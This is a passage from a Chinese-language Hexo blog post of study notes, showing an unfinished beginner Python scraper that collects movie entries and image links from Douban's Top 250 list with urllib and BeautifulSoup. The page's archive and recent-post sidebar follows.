datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣电影TOP250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line">findImgSrc&#x3D; re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S) </span><br><span class="line">    #askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0,25):  </span><br><span class="line">        url &#x3D; baseurl + str(i*25)</span><br><span class="line">        html &#x3D; askURL(url) </span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;): </span><br><span class="line">         data &#x3D;  [] </span><br><span class="line">         item &#x3D; str(item)</span><br><span class="line">         ImgSrc &#x3D; re.findall(findImgSrc, item)[0]</span><br><span class="line">        print(link)</span><br><span class="line">    return  datalist</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123; </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            print(e.reason)</span><br><span class="line">   return html</span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;: </span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>*查找到的图片链接</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201110141333167.png"></p>
<p>#其他查取的内容类似</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/" data-id="ckhbta9lx0000y0v3gkes7f4a" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/01/23/sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%8512/">sql注入补充</a>
          </li>
        
          <li>
            <a href="/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/">PHP小知识</a>
          </li>
        
          <li>
            <a href="/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/">实战</a>
          </li>
        
          <li>
            <a href="/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/">linux一些小知识</a>
          </li>
        
          <li>
            <a href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/">90道MISC部分</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>